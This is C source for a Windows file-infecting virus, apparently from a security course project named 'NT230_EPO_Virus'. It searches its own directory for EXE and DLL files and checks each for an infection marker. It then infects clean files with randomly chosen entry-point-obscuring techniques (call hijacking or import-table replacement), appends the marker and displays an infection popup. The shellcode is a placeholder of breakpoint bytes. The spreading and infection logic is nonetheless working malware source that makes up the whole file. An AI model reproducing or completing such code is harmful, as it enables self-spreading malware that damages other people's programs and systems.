#include "virus_payload.h"
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <io.h>

// Display infection popup message
void DisplayInfectionMessage() {
    MessageBoxA(NULL, INFECTION_MESSAGE, WINDOW_TITLE, MB_OK | MB_ICONINFORMATION);
}

// Check if a file is already infected by looking for marker
BOOL IsFileInfected(const char* filename) {
    FILE* file;
    char buffer[INFECTION_MARKER_SIZE];
    BOOL result = FALSE;

    file = fopen(filename, "rb");
    if (!file) {
        return FALSE;
    }

    // Check file size - if too small, not infected
    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    fseek(file, 0, SEEK_SET);

    if (file_size < INFECTION_MARKER_SIZE) {
        fclose(file);
        return FALSE;
    }

    // Search for infection marker in file
    // Try different positions
    long positions[] = { 
        512,           // Near PE header
        1024,          // Standard position
        file_size / 2, // Middle of file
        file_size - INFECTION_MARKER_SIZE - 100
    };

    for (int i = 0; i < 4; i++) {
        if (positions[i] > 0 && positions[i] < file_size - INFECTION_MARKER_SIZE) {
            fseek(file, positions[i], SEEK_SET);
            if (fread(buffer, 1, INFECTION_MARKER_SIZE, file) == INFECTION_MARKER_SIZE) {
                if (memcmp(buffer, INFECTION_MARKER, INFECTION_MARKER_SIZE) == 0) {
                    result = TRUE;
                    break;
                }
            }
        }
    }

    fclose(file);
    return result;
}

// Get directory path from full file path
void GetFileDirectory(const char* filepath, char* directory, size_t max_size) {
    size_t len = strlen(filepath);
    size_t i;

    // Find last backslash or forward slash
    for (i = len; i > 0; i--) {
        if (filepath[i] == '\\' || filepath[i] == '/') {
            break;
        }
    }

    if (i > 0) {
        strncpy_s(directory, max_size, filepath, i);
        directory[i] = '\0';
    } else {
        strncpy_s(directory, max_size, ".", max_size - 1);
        directory[max_size - 1] = '\0';
    }
}

// Scan directory and infect PE files
void InfectPEFilesInDirectory() {
    char current_dir[MAX_PATH];
    char search_path[MAX_PATH];
    char target_path[MAX_PATH];
    struct _finddata_t fileinfo;
    intptr_t handle;
    
    // Simple virus payload (will be inserted into infected files)
    // This is placeholder - in real scenario would be actual shellcode
    const unsigned char payload[] = { 0xCC, 0xCC, 0xCC, 0xCC };

    // Get current executable directory
    if (GetModuleFileNameA(NULL, current_dir, MAX_PATH) == 0) {
        GetCurrentDirectoryA(MAX_PATH, current_dir);
    }

    // Get directory only
    char dir_only[MAX_PATH];
    GetFileDirectory(current_dir, dir_only, MAX_PATH);

    // Search for all EXE files
    snprintf(search_path, MAX_PATH, "%s\\*.exe", dir_only);

    handle = _findfirst(search_path, &fileinfo);

    if (handle != -1) {
        do {
            // Skip if it's the current executable (virus itself)
            if (strcmp(fileinfo.name, "NT230_EPO_Virus.exe") == 0 || 
                strcmp(fileinfo.name, "virus_infector.exe") == 0 || 
                strcmp(fileinfo.name, "virus.exe") == 0) {
                continue;
            }

            snprintf(target_path, MAX_PATH, "%s\\%s", dir_only, fileinfo.name);

            // Check if already infected
            if (!IsFileInfected(target_path)) {
                printf("[*] Found uninfected file: %s\n", fileinfo.name);
                
                // Choose random EPO technique (50/50)
                if (rand() % 2 == 0) {
                    printf("[+] Applying Call Hijacking EPO...\n");
                    if (InfectPEFile_CallHijacking(target_path, (const char*)payload, sizeof(payload))) {
                        printf("[+] Successfully infected with Call Hijacking!\n");
                        // Add infection marker
                        FILE* file = fopen(target_path, "ab");
                        if (file) {
                            fwrite(INFECTION_MARKER, 1, INFECTION_MARKER_SIZE, file);
                            fclose(file);
                        }
                    } else {
                        printf("[-] Failed to infect with Call Hijacking\n");
                    }
                } else {
                    printf("[+] Applying IAT Replacing EPO...\n");
                    if (InfectPEFile_IATReplacing(target_path, (const char*)payload, sizeof(payload))) {
                        printf("[+] Successfully infected with IAT Replacing!\n");
                        // Add infection marker
                        FILE* file = fopen(target_path, "ab");
                        if (file) {
                            fwrite(INFECTION_MARKER, 1, INFECTION_MARKER_SIZE, file);
                            fclose(file);
                        }
                    } else {
                        printf("[-] Failed to infect with IAT Replacing\n");
                    }
                }
            }

        } while (_findnext(handle, &fileinfo) == 0);

        _findclose(handle);
    }

    // Also search for DLL files
    snprintf(search_path, MAX_PATH, "%s\\*.dll", dir_only);
    handle = _findfirst(search_path, &fileinfo);

    if (handle != -1) {
        do {
            snprintf(target_path, MAX_PATH, "%s\\%s", dir_only, fileinfo.name);

            if (!IsFileInfected(target_path)) {
                printf("[*] Found uninfected DLL: %s\n", fileinfo.name);
                
                // Choose random EPO technique
                if (rand() % 2 == 0) {
                    printf("[+] Applying Call Hijacking EPO...\n");
                    if (InfectPEFile_CallHijacking(target_path, (const char*)payload, sizeof(payload))) {
                        printf("[+] Successfully infected with Call Hijacking!\n");
                        FILE* file = fopen(target_path, "ab");
                        if (file) {
                            fwrite(INFECTION_MARKER, 1, INFECTION_MARKER_SIZE, file);
                            fclose(file);
                        }
                    }
                } else {
                    printf("[+] Applying IAT Replacing EPO...\n");
                    if (InfectPEFile_IATReplacing(target_path, (const char*)payload, sizeof(payload))) {
                        printf("[+] Successfully infected with IAT Replacing!\n");
                        FILE* file = fopen(target_path, "ab");
                        if (file) {
                            fwrite(INFECTION_MARKER, 1, INFECTION_MARKER_SIZE, file);
                            fclose(file);
                        }
                    }
                }
            }

        } while (_findnext(handle, &fileinfo) == 0);

        _findclose(handle);
    }
}
